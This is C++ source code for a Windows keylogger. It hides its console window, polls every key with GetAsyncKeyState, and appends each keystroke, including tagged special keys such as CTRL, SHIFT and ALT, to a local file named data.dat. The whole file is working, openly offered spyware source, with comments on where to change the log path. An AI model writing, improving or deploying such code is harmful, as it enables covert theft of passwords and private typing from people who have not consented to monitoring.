#include <Windows.h> // to hide console
#include <stdlib.h> // for basic functions
#include <iostream> // for basic functions
#include <fstream> //  to create oytput file 
#include <stdio.h>
#include <cstdlib>
// #include <sstream> 

using namespace std;

/* const char* ctrl = "¢";
const char* alt = "¤"; */

int log(string input) {
	fstream file;
	file.open("data.dat", fstream::app); // you can change the path by editing like this: "C:\Users\myUsername\Desktop\data.dat"
	if (file.is_open()) {
		file << input; // writes into file
		file.close();
	}
	return 0;
};


bool specialKeys(int sKey) { // if detects special chars write this strings
	switch (sKey) {
	case VK_SPACE:
		cout << " "; // writes space
		log(" ");
		return true;
	case VK_RETURN:
		cout << "\n"; // go on new line
		log("\n");
		return true;
	case VK_SHIFT:
		cout << "[SHIFT]";
		log("[SHIFT]");
		return true;
	case VK_BACK:
		cout << "[BACK]";
		log("[BACK]");
		return true;
	case VK_RBUTTON:
		cout << "[R_CLICK]";
		log("[R_CLICK]");
		return true;
	case VK_CAPITAL:
		cout << "[CAPS_LOCK]";
		log("[CAPS_LOCK]");
		return true;
	case VK_TAB:
		cout << "[TAB]";
		log("[TAB]");
		return true;
	case VK_UP:
		cout << "[UP_ARROW_KEY]";
		log("[UP_ARROW_KEY]");
		return true;
	case VK_DOWN:
		cout << "[DOWN_ARROW_KEY]";
		log("[DOWN_ARROW_KEY]");
		return true;
	case VK_LEFT:
		cout << "[LEFT_ARROW_KEY]";
		log("[LEFT_ARROW_KEY]");
		return true;
	case VK_RIGHT:
		cout << "[RIGHT_ARROW_KEY]";
		log("[RIGHT_ARROW_KEY]");
		return true;
	case VK_CONTROL:
		cout << "[CTRL]";
		log("[CTRL]");
		return true;
	case VK_MENU:
		cout << "[ALT]";
		log("[ALT]"); 
		return true;
	default:
		return false;
	}


}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide the console
	char k = 'x'; // set deafult char, changed later...

	while (true) {
		Sleep(10);
		for (int k = 8; k <= 190; k++) // for all the keys
		{
			if (GetAsyncKeyState(k) == -32767) { // if it's a pressed char
				if (specialKeys(k) == false) { // if it's not a special char
					/* stringstream convert;
					convert << k;
					const char* newK = convert.str().c_str();
					if (newK == ctrl) {
						cout << "Skipped CTRL char";
					}
					if (newK == alt) {
						cout << "Skipped ALT char";
					} */
							
					fstream file;
					file.open("data.dat", fstream::app);
					if (file.is_open()) {
						file << char(k); // writes into file
						file.close();
					}

				}
			}
		}
	}

	return 0;
}
